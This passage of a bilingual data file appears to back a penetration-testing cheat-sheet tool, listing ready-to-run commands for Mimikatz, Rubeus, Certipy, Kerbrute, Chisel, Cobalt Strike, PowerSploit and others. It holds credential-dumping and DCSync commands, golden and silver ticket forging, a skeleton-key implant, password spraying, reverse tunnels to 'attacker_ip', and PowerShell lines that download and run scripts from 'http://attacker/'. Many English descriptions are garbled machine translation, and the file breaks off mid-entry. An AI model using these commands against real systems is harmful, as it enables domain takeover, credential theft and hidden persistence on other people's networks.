      { name: { zh: '域管理员', en: 'Domain Admins' }, command: 'net group "Domain Admins" /domain', description: { zh: '列出域管理员', en: 'ListDomain Admins' }, platform: 'windows' },
      { name: { zh: '共享列表', en: 'Share List' }, command: 'net share', description: { zh: '列出共享资源', en: 'List SharesResource' }, platform: 'windows' },
      { name: { zh: '创建共享', en: 'Create Share' }, command: 'net share sharename=C:\\path /grant:everyone,full', description: { zh: '创建共享', en: 'Create Share' }, platform: 'windows' },
      { name: { zh: '会话列表', en: 'Session List' }, command: 'net session', description: { zh: '列出当前会话', en: 'ListcurrentSession' }, platform: 'windows' },
      { name: { zh: '连接共享', en: 'Connect to Share' }, command: 'net use \\\\target\\share password /user:domain\\user', description: { zh: '连接网络共享', en: 'ConnectionNetworkShares' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'bloodhound-tool',
    name: 'BloodHound',
    description: { zh: 'Active Directory关系分析工具', en: 'Active Directory relationship analysis tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install bloodhound',
    commands: [
      { name: { zh: '启动Neo4j', en: 'Start Neo4j' }, command: 'sudo neo4j console', description: { zh: '启动Neo4j数据库', en: 'Start Neo4j database' }, platform: 'linux' },
      { name: { zh: '启动BloodHound', en: 'Start BloodHound' }, command: 'bloodhound', description: { zh: '启动BloodHound界面', en: 'Launch the BloodHound GUI' }, platform: 'linux' },
      { name: { zh: 'SharpHound采集', en: 'SharpHound Collection' }, command: 'SharpHound.exe -c All', description: { zh: '采集所有域信息', en: 'Collect all domain information' }, platform: 'windows' },
      { name: { zh: 'PowerShell采集', en: 'PowerShell Collection' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All', description: { zh: 'PowerShell远程加载采集', en: 'PowerShell remote-load collection' }, platform: 'windows' },
      { name: { zh: 'Python采集', en: 'Python Collection' }, command: 'bloodhound-python -u user -p password -d domain.com -ns dc_ip', description: { zh: 'Python版本采集', en: 'Python version collection' }, platform: 'linux' },
      { name: { zh: '查询域管路径', en: 'Query Domain Admin Path' }, command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p', description: { zh: '查询到域管理员的最短路径', en: 'Query shortest path to Domain Admins' }, platform: 'all' },
      { name: { zh: '查询DCSync权限', en: 'Query DCSync Privileges' }, command: 'MATCH (n)-[r:DCSync]->(m) RETURN n,m', description: { zh: '查询DCSync权限关系', en: 'Query DCSync privilege relationships' }, platform: 'all' },
      { name: { zh: '查询无约束委派', en: 'Query Unconstrained Delegation' }, command: 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c', description: { zh: '查询无约束委派计算机', en: 'Query Unconstrained DelegationComputers' }, platform: 'all' },
      { name: { zh: '查询高价值目标', en: 'Query High-Value Targets' }, command: 'MATCH (n:User) WHERE n.admincount=true RETURN n', description: { zh: '查询高权限用户', en: 'QueryHighPermissionUsers' }, platform: 'all' }
    ],
    references: ['https://bloodhound.readthedocs.io/']
  },
  {
    id: 'mimikatz-tool',
    name: 'Mimikatz',
    description: { zh: 'Windows凭证提取工具', en: 'WindowsCredentialsExtractTools' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '获取Debug权限', en: 'Obtain Debug Privilege' }, command: 'privilege::debug', description: { zh: '获取Debug权限', en: 'Obtain Debug Privilege' }, platform: 'windows' },
      { name: { zh: '抓取凭证', en: 'Dump Credentials' }, command: 'sekurlsa::logonpasswords', description: { zh: '抓取所有登录凭证', en: 'Dump all login credentials' }, platform: 'windows' },
      { name: { zh: '导出LSASS', en: 'Export LSASS' }, command: 'sekurlsa::minidump lsass.dmp', description: { zh: '从LSASS转储文件提取', en: 'Extract from LSASS memory dump file' }, platform: 'windows' },
      { name: 'Pass-the-Hash', command: 'sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH', description: { zh: '哈希传递攻击', en: 'Pass the HashAttack' }, platform: 'windows' },
      { name: 'DCSync', command: 'lsadump::dcsync /domain:domain.com /user:Administrator', description: { zh: 'DCSync获取域管哈希', en: 'DCSyncGet Domain Adminshash' }, platform: 'windows' },
      { name: { zh: '导出SAM', en: 'Export SAM' }, command: 'lsadump::sam', description: { zh: '导出SAM数据库', en: 'Export SAMDatabase' }, platform: 'windows' },
      { name: { zh: '导出LSA', en: 'Export LSA' }, command: 'lsadump::lsa /inject', description: { zh: '导出LSA密钥', en: 'Export LSAkey' }, platform: 'windows' },
      { name: { zh: '黄金票据', en: 'Golden Ticket' }, command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt', description: { zh: '生成黄金票据', en: 'GenerateGolden Ticket' }, platform: 'windows' },
      { name: { zh: '白银票据', en: 'Silver Ticket' }, command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt', description: { zh: '生成白银票据', en: 'GenerateSilver Ticket' }, platform: 'windows' },
      { name: { zh: '列出票据', en: 'List Tickets' }, command: 'kerberos::list', description: { zh: '列出Kerberos票据', en: 'ListKerberosTicket' }, platform: 'windows' },
      { name: { zh: '导出票据', en: 'Export Tickets' }, command: 'kerberos::list /export', description: { zh: '导出Kerberos票据', en: 'ExportKerberosTicket' }, platform: 'windows' },
      { name: 'Skeleton Key', command: 'misc::skeleton', description: { zh: '植入万能密码', en: 'Inject a skeleton key (master password)' }, platform: 'windows' }
    ],
    references: ['https://github.com/gentilkiwi/mimikatz']
  },
  {
    id: 'rubeus-tool',
    name: 'Rubeus',
    description: { zh: 'Kerberos攻击工具', en: 'KerberosAttackTools' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    installation: { zh: '编译或下载二进制文件', en: 'Compile or DownloadbinaryFile' },
    commands: [
      { name: 'Kerberoasting', command: 'Rubeus.exe kerberoast /stats', description: { zh: 'Kerberoasting攻击', en: 'Kerberoasting Attack' }, platform: 'windows' },
      { name: 'AS-REP Roasting', command: 'Rubeus.exe asreproast /user:username', description: { zh: 'AS-REP Roasting攻击', en: 'AS-REP RoastingAttack' }, platform: 'windows' },
      { name: { zh: '请求TGT', en: 'Request TGT' }, command: 'Rubeus.exe asktgt /user:username /password:password', description: { zh: '请求TGT票据', en: 'Request TGTTicket' }, platform: 'windows' },
      { name: { zh: '请求服务票据', en: 'Request Service Ticket' }, command: 'Rubeus.exe asktgs /service:cifs/server.domain.com /ticket:TICKET_BASE64', description: { zh: '请求服务票据', en: 'Request Service Ticket' }, platform: 'windows' },
      { name: { zh: 'S4U攻击', en: 'S4U Attack' }, command: 'Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target', description: { zh: 'S4U协议攻击', en: 'S4UProtocolAttack' }, platform: 'windows' },
      { name: { zh: '黄金票据', en: 'Golden Ticket' }, command: 'Rubeus.exe golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator', description: { zh: '生成黄金票据', en: 'GenerateGolden Ticket' }, platform: 'windows' },
      { name: { zh: '票据注入', en: 'Ticket Injection' }, command: 'Rubeus.exe ptt /ticket:TICKET_BASE64', description: { zh: '注入票据', en: 'InjectionTicket' }, platform: 'windows' },
      { name: { zh: '列出票据', en: 'List Tickets' }, command: 'Rubeus.exe klist', description: { zh: '列出当前票据', en: 'ListcurrentTicket' }, platform: 'windows' },
      { name: { zh: '监视票据', en: 'Monitor Tickets' }, command: 'Rubeus.exe monitor /interval:30', description: { zh: '监视新票据', en: 'Monitor for new tickets' }, platform: 'windows' }
    ],
    references: ['https://github.com/GhostPack/Rubeus']
  },
  {
    id: 'certipy-tool',
    name: 'Certipy',
    description: { zh: 'ADCS证书服务攻击工具', en: 'ADCSCertificateServiceAttackTools' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    installation: 'pip install certipy-ad',
    commands: [
      { name: { zh: '枚举ADCS', en: 'Enumerate ADCS' }, command: 'certipy find -u user@domain.com -p password -dc-ip dc_ip', description: { zh: '枚举证书服务', en: 'EnumerationCertificateService' }, platform: 'linux' },
      { name: { zh: 'ESC1攻击', en: 'ESC1 Attack' }, command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template Template -upn Administrator@domain.com', description: { zh: 'ESC1模板滥用', en: 'ESC1 template abuse' }, platform: 'linux' },
      { name: { zh: 'ESC2攻击', en: 'ESC2 Attack' }, command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE', description: { zh: 'ESC2任意用途', en: 'ESC2 any-purpose template' }, platform: 'linux' },
      { name: { zh: '证书认证', en: 'Certificate Authentication' }, command: 'certipy auth -pfx administrator.pfx -domain domain.com', description: { zh: '使用证书认证', en: 'UseCertificate Authentication' }, platform: 'linux' },
      { name: { zh: 'ESC8中继', en: 'ESC8 Relay' }, command: 'certipy relay -ca ca_server -template DomainController', description: { zh: 'HTTP中继攻击', en: 'HTTPRelayAttack' }, platform: 'linux' },
      { name: { zh: '导出PFX', en: 'Export PFX' }, command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template User -out user.pfx', description: { zh: '导出PFX证书', en: 'Export PFXCertificate' }, platform: 'linux' }
    ],
    references: ['https://github.com/ly4k/Certipy']
  },
  {
    id: 'kerbrute-tool',
    name: 'Kerbrute',
    description: { zh: 'Kerberos暴力破解工具', en: 'KerberosBrute ForceTools' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '用户枚举', en: 'User Enumeration' }, command: 'kerbrute userenum -d domain.com --dc dc_ip users.txt', description: { zh: '枚举域用户', en: 'EnumerationDomain Users' }, platform: 'all' },
      { name: { zh: '密码喷洒', en: 'Password Spraying' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123', description: { zh: '密码喷洒攻击', en: 'Password SprayingAttack' }, platform: 'all' },
      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username', description: { zh: '暴力破解用户', en: 'Brute ForceUsers' }, platform: 'all' },
      { name: { zh: '域验证', en: 'Domain Validation' }, command: 'kerbrute -d domain.com --dc dc_ip user:password', description: { zh: '验证凭证', en: 'VerifyCredentials' }, platform: 'all' }
    ],
    references: ['https://github.com/ropnop/kerbrute']
  },
  {
    id: 'sharphound-tool',
    name: 'SharpHound',
    description: { zh: 'BloodHound数据采集器', en: 'BloodHound data collector' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '完整采集', en: 'Full Collection' }, command: 'SharpHound.exe -c All', description: { zh: '采集所有数据', en: 'Collect all data' }, platform: 'windows' },
      { name: { zh: '指定域控', en: 'Specify Domain Controller' }, command: 'SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.domain.com', description: { zh: '指定域控制器', en: 'Specify Domain Controller' }, platform: 'windows' },
      { name: { zh: '指定域', en: 'Specify Domain' }, command: 'SharpHound.exe -c All --Domain domain.com', description: { zh: '指定域名', en: 'Specify Domainname' }, platform: 'windows' },
      { name: { zh: '隐蔽模式', en: 'Stealth Mode' }, command: 'SharpHound.exe -c All --RandomizeFilenames --OutputDirectory C:\\Users\\Public', description: { zh: '随机文件名隐蔽采集', en: 'Stealthy collection with randomized filename' }, platform: 'windows' },
      { name: { zh: '采集方法', en: 'Collection Method' }, command: 'SharpHound.exe -c Default,ACL,Trusts,Container', description: { zh: '指定采集方法', en: 'Specify collection method' }, platform: 'windows' }
    ],
    references: ['https://github.com/BloodHoundAD/BloodHound']
  },
  {
    id: 'seatbelt-tool',
    name: 'Seatbelt',
    description: { zh: 'Windows安全信息收集工具', en: 'WindowsSecurityInformation GatheringTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: { zh: '编译或下载二进制文件', en: 'Compile or DownloadbinaryFile' },
    commands: [
      { name: { zh: '完整收集', en: 'Full Collection' }, command: 'Seatbelt.exe -group=all', description: { zh: '收集所有信息', en: 'CollectallInformation' }, platform: 'windows' },
      { name: { zh: '系统信息', en: 'System Info' }, command: 'Seatbelt.exe -group=system', description: { zh: '收集系统信息', en: 'CollectSystem Info' }, platform: 'windows' },
      { name: { zh: '用户信息', en: 'User Info' }, command: 'Seatbelt.exe -group=user', description: { zh: '收集用户信息', en: 'CollectUser Info' }, platform: 'windows' },
      { name: { zh: '安全配置', en: 'Security Configuration' }, command: 'Seatbelt.exe -group=security', description: { zh: '收集安全配置', en: 'CollectSecurity Configuration' }, platform: 'windows' },
      { name: { zh: '网络信息', en: 'Network Info' }, command: 'Seatbelt.exe -group=network', description: { zh: '收集网络信息', en: 'CollectNetwork Info' }, platform: 'windows' },
      { name: { zh: '远程收集', en: 'Remote Collection' }, command: 'Seatbelt.exe -group=all -computername=TARGET -username=DOMAIN\\user -password=password', description: { zh: '远程信息收集', en: 'RemoteInformation Gathering' }, platform: 'windows' }
    ],
    references: ['https://github.com/GhostPack/Seatbelt']
  },
  {
    id: 'winpeas-tool',
    name: 'WinPEAS',
    description: { zh: 'Windows提权辅助工具', en: 'WindowsPrivilege escalationauxiliaryTools' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '完整扫描', en: 'Full Scan' }, command: 'winpeas.exe', description: { zh: '执行完整提权扫描', en: 'ExecutecompletePrivilege escalationScan' }, platform: 'windows' },
      { name: { zh: '快速扫描', en: 'Fast Scan' }, command: 'winpeas.exe fast', description: { zh: '快速扫描模式', en: 'Fast ScanMode' }, platform: 'windows' },
      { name: { zh: '详细输出', en: 'Verbose Output' }, command: 'winpeas.exe cmd', description: { zh: '显示详细命令输出', en: 'Display verbose command output' }, platform: 'windows' },
      { name: { zh: '保存结果', en: 'Save Results' }, command: 'winpeas.exe > output.txt', description: { zh: '保存扫描结果', en: 'SaveScanResult' }, platform: 'windows' }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'linpeas-tool',
    name: 'LinPEAS',
    description: { zh: 'Linux提权辅助工具', en: 'LinuxPrivilege escalationauxiliaryTools' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    installation: { zh: '下载脚本文件', en: 'DownloadScriptFile' },
    commands: [
      { name: { zh: '执行扫描', en: 'Execute Scan' }, command: './linpeas.sh', description: { zh: '执行完整提权扫描', en: 'ExecutecompletePrivilege escalationScan' }, platform: 'linux' },
      { name: { zh: '快速扫描', en: 'Fast Scan' }, command: './linpeas.sh -a', description: { zh: '自动发现模式', en: 'AutomaticDiscoverMode' }, platform: 'linux' },
      { name: { zh: '指定检查', en: 'Specify Check' }, command: './linpeas.sh -P', description: { zh: '检查密码策略', en: 'CheckPassword Policy' }, platform: 'linux' },
      { name: { zh: '保存结果', en: 'Save Results' }, command: './linpeas.sh > output.txt', description: { zh: '保存扫描结果', en: 'SaveScanResult' }, platform: 'linux' }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'chisel-tool',
    name: 'Chisel',
    description: { zh: 'HTTP隧道工具', en: 'HTTP TunnelTools' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '服务端', en: 'Server-Side' }, command: './chisel server -p 8000 --reverse', description: { zh: '启动服务端', en: 'Start the server' }, platform: 'linux' },
      { name: { zh: '反向SOCKS', en: 'Reverse SOCKS' }, command: 'chisel.exe client attacker_ip:8000 R:socks', description: { zh: '建立反向SOCKS代理', en: 'EstablishReverse SOCKS Proxy' }, platform: 'windows' },
      { name: { zh: '端口转发', en: 'Port Forwarding' }, command: 'chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389', description: { zh: '端口转发', en: 'Port Forwarding' }, platform: 'windows' },
      { name: { zh: '正向SOCKS', en: 'Forward SOCKS' }, command: 'chisel.exe client attacker_ip:8000 socks', description: { zh: '建立正向SOCKS代理', en: 'EstablishForward SOCKS Proxy' }, platform: 'windows' },
      { name: { zh: '多端口转发', en: 'Multi-Port Forwarding' }, command: 'chisel.exe client attacker_ip:8000 R:80:127.0.0.1:80 R:3389:127.0.0.1:3389', description: { zh: '多端口转发', en: 'Multi-Port Forwarding' }, platform: 'windows' }
    ],
    references: ['https://github.com/jpillora/chisel']
  },
  {
    id: 'ligolo-tool',
    name: 'Ligolo-ng',
    description: { zh: '隧道工具', en: 'tunnelTools' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: { zh: '下载二进制文件', en: 'DownloadbinaryFile' },
    commands: [
      { name: { zh: '启动代理', en: 'Start Proxy' }, command: 'sudo proxy -selfcert', description: { zh: '启动代理服务器', en: 'Start ProxyServer' }, platform: 'linux' },
      { name: { zh: 'Agent连接', en: 'Agent Connect' }, command: 'agent.exe -connect attacker_ip:11601 -ignore-cert', description: { zh: 'Agent连接到代理', en: 'Agent Connect to Proxy' }, platform: 'windows' },
      { name: { zh: '创建会话', en: 'Create Session' }, command: 'session\nsession_select_id', description: { zh: '选择会话', en: 'Select a session' }, platform: 'linux' },
      { name: { zh: '添加路由', en: 'Add Route' }, command: 'start_tunnel', description: { zh: '启动隧道', en: 'Starttunnel' }, platform: 'linux' },
      { name: { zh: '添加网段', en: 'Add Network Segment' }, command: 'interface_add_route 10.10.10.0/24', description: { zh: '添加目标网段', en: 'AddTargetnetwork segment' }, platform: 'linux' }
    ],
    references: ['https://github.com/nicocha30/ligolo-ng']
  },
  {
    id: 'sharpsmbclient-tool',
    name: 'SharpSMBClient',
    description: { zh: 'SMB客户端工具', en: 'SMBClientTools' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译或下载二进制文件', en: 'Compile or DownloadbinaryFile' },
    commands: [
      { name: { zh: '列出共享', en: 'List Shares' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -L', description: { zh: '列出SMB共享', en: 'ListSMBShares' }, platform: 'windows' },
      { name: { zh: '列出目录', en: 'List Directory' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -l', description: { zh: '列出共享目录', en: 'List SharesDirectory' }, platform: 'windows' },
      { name: { zh: '下载文件', en: 'Download File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -g "path\\file"', description: { zh: '下载文件', en: 'Download File' }, platform: 'windows' },
      { name: { zh: '上传文件', en: 'Upload File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -p local_file -r remote_path', description: { zh: '上传文件', en: 'Upload File' }, platform: 'windows' }
    ],
    references: ['https://github.com/0xthirteen/SharpSMBClient']
  },
  {
    id: 'donpapi-tool',
    name: 'DonPAPI',
    description: { zh: 'DPAPI凭证提取工具', en: 'DPAPI Credential ExtractionTools' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    installation: 'pip install donpapi',
    commands: [
      { name: { zh: '提取凭证', en: 'Extract Credentials' }, command: 'donpapi domain/user:password@target_ip', description: { zh: '提取DPAPI凭证', en: 'ExtractDPAPICredentials' }, platform: 'linux' },
      { name: { zh: '使用哈希', en: 'Using Hash' }, command: 'donpapi -hashes :NTHASH domain/user@target_ip', description: { zh: '使用哈希认证', en: 'Using HashAuthentication' }, platform: 'linux' },
      { name: { zh: '批量提取', en: 'Batch Extract' }, command: 'donpapi domain/user:password@targets.txt', description: { zh: '批量提取凭证', en: 'batchExtract Credentials' }, platform: 'linux' }
    ],
    references: ['https://github.com/login-securite/DonPAPI']
  },
  {
    id: 'powersploit-tool',
    name: 'PowerSploit',
    description: { zh: 'PowerShell渗透测试框架', en: 'PowerShell penetration testing framework' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载脚本文件', en: 'DownloadScriptFile' },
    commands: [
      { name: { zh: '加载PowerView', en: 'Load PowerView' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")', description: { zh: '远程加载PowerView', en: 'RemoteLoad PowerView' }, platform: 'windows' },
      { name: { zh: '获取域信息', en: 'Get Domain Info' }, command: 'Get-NetDomain', description: { zh: '获取域信息', en: 'Get Domain Info' }, platform: 'windows' },
      { name: { zh: '获取域用户', en: 'Get Domain Users' }, command: 'Get-NetUser', description: { zh: '获取域用户', en: 'Get Domain Users' }, platform: 'windows' },
      { name: { zh: '获取域管', en: 'Get Domain Admins' }, command: 'Get-NetGroup "Domain Admins"', description: { zh: '获取域管理员', en: 'Get Domain Admins group members' }, platform: 'windows' },
      { name: { zh: '获取域控', en: 'Get Domain Controllers' }, command: 'Get-NetDomainController', description: { zh: '获取域控制器', en: 'Get Domain Controllers' }, platform: 'windows' },
      { name: { zh: '查找管理员', en: 'Find Admins' }, command: 'Find-DomainUserLocation', description: { zh: '查找域管理员登录位置', en: 'Find where Domain Admins are logged in' }, platform: 'windows' },
      { name: { zh: '获取ACL', en: 'Get ACL' }, command: 'Get-ObjectAcl -SamAccountName target', description: { zh: '获取对象ACL', en: 'Obtain for ObjectACL' }, platform: 'windows' },
      { name: { zh: '添加ACL权限', en: 'Add ACL Permission' }, command: 'Add-DomainObjectAcl -TargetIdentity target -Rights DCSync', description: { zh: '添加DCSync权限', en: 'AddDCSyncPermission' }, platform: 'windows' }
    ],
    references: ['https://github.com/PowerShellMafia/PowerSploit']
  },
  {
    id: 'cobaltstrike-tool',
    name: 'Cobalt Strike',
    description: { zh: '红队渗透测试框架', en: 'Red team penetration testing framework' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    installation: { zh: '商业软件', en: 'Commercial software' },
    commands: [
      { name: { zh: '启动团队服务器', en: 'Start Team Server' }, command: './teamserver ip password [C2配置文件]', description: { zh: '启动团队服务器', en: 'Start Team Server' }, platform: 'linux' },
      { name: { zh: '生成Payload', en: 'Generate Payload' }, command: 'Attacks -> Packages -> Windows Executable', description: { zh: '生成可执行Payload', en: 'GenerateCanExecutePayload' }, platform: 'all' },
      { name: { zh: '监听器', en: 'Listener' }, command: 'Cobalt Strike -> Listeners -> Add', description: { zh: '添加监听器', en: 'AddListener' }, platform: 'all' },
      { name: { zh: 'Beacon命令', en: 'Beacon Commands' }, command: 'shell whoami\nps\nhashdump\nmimikatz', description: { zh: 'Beacon常用命令', en: 'BeaconCommonCommand' }, platform: 'all' },
      { name: 'SMB Beacon', command: 'beacon> link target_ip', description: { zh: 'SMB Beacon横向', en: 'SMB Beacon lateral movement' }, platform: 'windows' },
      { name: { zh: 'SOCKS代理', en: 'SOCKS Proxy' }, command: 'beacon> socks 1080', description: { zh: '启动SOCKS代理', en: 'StartSOCKS Proxy' }, platform: 'windows' },
      { name: { zh: '令牌窃取', en: 'Token Theft' }, command: 'beacon> steal_token PID', description: { zh: '窃取进程令牌', en: 'StealProcessToken' }, platform: 'windows' },
      { name: 'Runas', command: 'beacon> runas domain\\user password command', description: { zh: '以其他用户运行', en: 'with otherUsersRun' }, platform: 'windows' }
    ],
    references: ['https://www.cobaltstrike.com/']
  },
  {
    id: 'searchsploit-tool',
    name: 'SearchSploit',
    description: { zh: '漏洞搜索工具', en: 'VulnerabilitySearchTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install exploitdb',
    commands: [
      { name: { zh: '搜索漏洞', en: 'Search Exploits' }, command: 'searchsploit apache 2.4', description: { zh: '搜索Apache漏洞', en: 'SearchApacheVulnerability' }, platform: 'linux' },
      { name: { zh: '精确搜索', en: 'Exact Search' }, command: 'searchsploit -e "Apache 2.4"', description: { zh: '精确匹配搜索', en: 'Exact match search' }, platform: 'linux' },
      { name: { zh: '排除结果', en: 'Exclude Results' }, command: 'searchsploit apache --exclude="DoS"', description: { zh: '排除特定类型', en: 'Exclude specific type' }, platform: 'linux' },
      { name: { zh: '查看漏洞', en: 'View Exploit' }, command: 'searchsploit -x exploits/xxx.py', description: { zh: '查看漏洞代码', en: 'View ExploitCode' }, platform: 'linux' },
      { name: { zh: '复制漏洞', en: 'Copy Exploit' }, command: 'searchsploit -m exploits/xxx.py', description: { zh: '复制到当前目录', en: 'Copy to currentDirectory' }, platform: 'linux' },
      { name: { zh: '更新数据库', en: 'Update Database' }, command: 'searchsploit -u', description: { zh: '更新漏洞数据库', en: 'UpdateVulnerabilityDatabase' }, platform: 'linux' }
    ],
    references: ['https://www.exploit-db.com/']
  },
  {
    id: 'wfuzz-tool',
    name: 'WFuzz',
    description: { zh: 'Web模糊测试工具', en: 'WebFuzz TestingTools' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install wfuzz',
    commands: [
      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://target.com/FUZZ', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
      { name: { zh: '过滤响应', en: 'Filter Response' }, command: 'wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ', description: { zh: '过滤404响应', en: 'Filter404Response' }, platform: 'linux' },
      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/', description: { zh: 'Cookie模糊测试', en: 'CookieFuzz Testing' }, platform: 'linux' },
      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ', description: { zh: '递归扫描', en: 'Recursive Scan' }, platform: 'linux' }
    ],
    references: ['https://github.com/xmendez/wfuzz']
  },
  {
    id: 'amass-tool',
    name: 'Amass',
    description: { zh: '子域名枚举工具', en: 'Subdomain EnumerationTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install amass',
    commands: [
      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'amass enum -d target.com', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
      { name: { zh: '被动枚举', en: 'Passive Enumeration' }, command: 'amass enum -passive -d target.com', description: { zh: '被动信息收集', en: 'Passive information gathering' }, platform: 'linux' },
      { name: { zh: '主动枚举', en: 'Active Enumeration' }, command: 'amass enum -active -d target.com', description: { zh: '主动信息收集', en: 'Active information gathering' }, platform: 'linux' },
      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'amass enum -brute -d target.com -w wordlist.txt', description: { zh: '暴力破解子域名', en: 'Brute ForceSub-Domain name' }, platform: 'linux' },
      { name: { zh: '保存结果', en: 'Save Results' }, command: 'amass enum -d target.com -o output.txt', description: { zh: '保存枚举结果', en: 'SaveEnumerationResult' }, platform: 'linux' }
    ],
    references: ['https://github.com/OWASP/Amass']
  },
  {
    id: 'subfinder-tool',
    name: 'Subfinder',
    description: { zh: '子域名发现工具', en: 'Sub-Domain nameDiscoverTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    commands: [
      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'subfinder -d target.com', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
      { name: { zh: '递归枚举', en: 'Recursive Enumeration' }, command: 'subfinder -d target.com -recursive', description: { zh: '递归枚举', en: 'Recursive Enumeration' }, platform: 'linux' },
      { name: { zh: '保存结果', en: 'Save Results' }, command: 'subfinder -d target.com -o output.txt', description: { zh: '保存结果', en: 'Save Results' }, platform: 'linux' },
      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'subfinder -d target.com -json -o output.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' },
      { name: { zh: '批量处理', en: 'Batch Processing' }, command: 'subfinder -dL domains.txt', description: { zh: '批量处理域名', en: 'Batch ProcessingDomain name' }, platform: 'linux' }
    ],
    references: ['https://github.com/projectdiscovery/subfinder']
  },
  {
    id: 'httpx-tool',
    name: 'HTTPX',
    description: { zh: 'HTTP探测工具', en: 'HTTP ProbingTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
    commands: [
      { name: { zh: 'HTTP探测', en: 'HTTP Probing' }, command: 'cat urls.txt | httpx', description: { zh: '探测HTTP服务', en: 'DetectHTTPService' }, platform: 'linux' },
      { name: { zh: '获取标题', en: 'Get Title' }, command: 'cat urls.txt | httpx -title -status-code', description: { zh: '获取页面标题和状态码', en: 'Obtain page titles and status codes' }, platform: 'linux' },
      { name: { zh: '截图', en: 'Screenshot' }, command: 'cat urls.txt | httpx -screenshot', description: { zh: '网页截图', en: 'Web pageScreenshot' }, platform: 'linux' },
      { name: { zh: '指纹识别', en: 'Fingerprinting' }, command: 'cat urls.txt | httpx -tech-detect', description: { zh: '技术栈识别', en: 'TechniquestackIdentify' }, platform: 'linux' },
      { name: { zh: '保存结果', en: 'Save Results' }, command: 'cat urls.txt | httpx -o output.txt', description: { zh: '保存结果', en: 'Save Results' }, platform: 'linux' }
    ],
    references: ['https://github.com/projectdiscovery/httpx']
  }
,
  {
